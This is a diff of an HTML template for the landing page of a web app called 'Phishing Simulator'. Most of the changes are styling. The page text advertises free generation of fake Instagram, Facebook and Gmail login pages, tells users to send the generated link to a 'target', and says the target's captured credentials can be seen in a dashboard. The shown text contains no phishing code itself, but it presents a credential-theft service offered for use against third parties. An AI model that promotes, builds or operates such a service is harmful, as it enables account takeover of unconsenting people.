@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html>
+ 
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<head>
-<title>Phishing</title>
-<link rel='stylesheet' type="text/css" href="static/nav.css">
 <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.png')}}">
+<link rel='stylesheet' type="text/css" href="/static/nav.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<head>
+  <title>Phishing Simulator</title>
 <script src="/static/nav.js"></script>
 </head>
 
 
 
 
-<body style="background-color: pink;">
+<body style="background-color: #EEE2DC; color: #AC3B61;">
 
 
 <div class="topnav" style="margin:auto;">
@@ -20,52 +22,62 @@
   <a href="/apps">Apps</a>
   <a  href="/dashboard">Dashboard</a>
    
-  <div>
-    <input type="submit" id="login_button" 
-      style="background-color: bisque;
-      float: right; cursor: pointer;"
-      {% if isLogged == True %} value={{uid}}
-      onclick="see_user()"
-      {% else %}
-      value="Login" onclick="login()"
-      {% endif %}></input>
-
-      <input type="submit"
-      {% if isLogged == True %} value="Logout"
-      style="float: right; cursor: pointer;"
-      onclick="logout()"
+  <div >
+      <input type="submit" id="logout_button"
+      class="btn btn-danger"
+      {% if isLogged == True %} 
+      value="Logout" onclick="logout()"
       {% else %}
       style="display: none;"
       {% endif %}>
     </input>
+
+    <input type="submit" id="login_button" 
+    class="btn btn-info"
+    {% if isLogged == True %} 
+    value={{uid}} onclick="see_user()"
+    {% else %}
+    value="Login" onclick="login()"
+    {% endif %}></input>
 </div>
 
 
 </div>
 
  <center style=" color: rgb(43, 15, 126); margin:auto;">
-  <h2 >Welcome to Phishing Simulation</h2>
+  <h3 style="width: fit-content; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">
+    Welcome to Phishing Simulator</h3>
 </center>
+<br>
 
 <div style="display: inline-flex;">
-<h3 style="float: left;">This WebApp is capable to make a Phishing page for you.   Like this ->
+<h4 style="float: left;">This WebApp is capable to make a Phishing page for sites like Instagram, Facebook, Gmail for you.  
+<div style="float: right; margin-top: 20px; margin-right: 5px;"> Like this  &#128073; </div>
+
+<center style="margin-top: 10px; color: black;"><b> FREE</b> </center>
+<br>
+You just have to <a href="/login" style="box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">Login</a>  and go-to <a href="/apps" style="box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">Apps</a> section.
 <br>
 <br>
-You just have to <a href="/login">Login</a>  and go-to <a href="/apps">Apps</a> section.
-<br>
-<br>
-Choose the app and share the generated link to target.
+Choose the app and share the generated link to target &#129333;.
 <br>
 <br>
 
-You Can see the the Credential of target in <a href="/dashboard">Dashboard</a>
-</h3>
-<img src="/static/instagram/insta_demo.PNG" alt="insta demo" onclick="window.open('/instagram.com','_self');" width="150" height="180" style=" float: right; cursor: pointer;">
+You Can see &#128064; the the Credential of target in <a href="/dashboard" style="box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">Dashboard</a>
+</h4>
+<img src="/static/instagram/insta_demo.PNG" alt="insta demo" onclick="window.open('/instagram.com','_self');" width="120" height="160" style=" float: right; cursor: pointer; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">
 
 </div>
-<footer style="position: fixed;text-align: center;margin-right: 50px; bottom: 0; width: 100%; border: 5px solid rgb(36, 156, 186);">
-<h2>Contact Us</h2>
- </footer>
+
+
+
+
+<footer style=" position: fixed; left: 50%; bottom: 20px; transform: translate(-50%, -50%); margin: 0 auto;">
+  
+      <center><input type="submit" onclick="window.open('/contactus','_self')" value="Contact Us"></input></center>
+      <center><p>Phishing Simulator</p></center>
+      <center><p>@2022</p></center>
+    </footer> 
 </body>
 </html>
 
